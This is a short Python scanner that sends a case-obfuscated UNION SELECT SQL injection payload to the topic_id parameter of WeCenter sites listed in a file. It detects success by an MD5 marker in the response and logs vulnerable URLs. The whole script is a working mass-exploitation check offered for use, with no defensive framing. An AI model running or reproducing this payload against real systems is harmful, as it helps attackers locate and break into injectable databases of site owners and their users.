import sys
import json
import requests
import warnings



urls = open('url.txt')

poc = '/index.php/api/Uploadify/preview'



for i in urls:
    url = i.rstrip("\n")
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/explore/UPLOAD/?/topic/ajax/question_list/type-best&topic_id=1%29UnIoN/**/SeLeCt/**/Md5(1234)%23"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
            print("[+]存在wecenter SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('SQL注入漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在wecenter_topic_id_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

